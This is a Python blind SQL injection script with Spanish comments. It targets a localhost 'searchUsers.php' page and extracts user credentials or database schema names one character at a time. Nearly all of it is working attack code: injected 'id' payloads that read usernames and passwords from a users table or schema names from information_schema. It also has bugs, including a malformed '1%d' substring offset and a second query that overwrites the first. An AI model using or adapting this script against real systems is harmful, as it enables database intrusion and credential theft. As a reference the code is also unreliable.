```python

#!/usr/bin/python3
import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)
	
#CTRL+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Datos extraídos")

	extracted_info = ""

	for position in range(1, 150): #rango de numero de caracteres
		for character in range (33, 126): #rando de caracteres en el mapa ascii
			#lista usuarios y contraseñas
			sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),1%d,1)) from users where id = 1)=%d)" % (position, character)

			#COMENTA 1 DE LAS 2 QUERYS, SOLO FUNCIONA 1 O LA OTRA DE UNA VEZ

			#Lista las bases de datos
			sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),1%d,1)) from users where id = 1)=%d)" % (position, character)

			p1.status(sqli_url)

			r = requests.get(sqli_url)
			
			if r.status_code == 200:
				extracted_info += chr(character)
				p2.status(extracted_info)
				break

if __name__ == '__main__':

	makeSQLI()
```
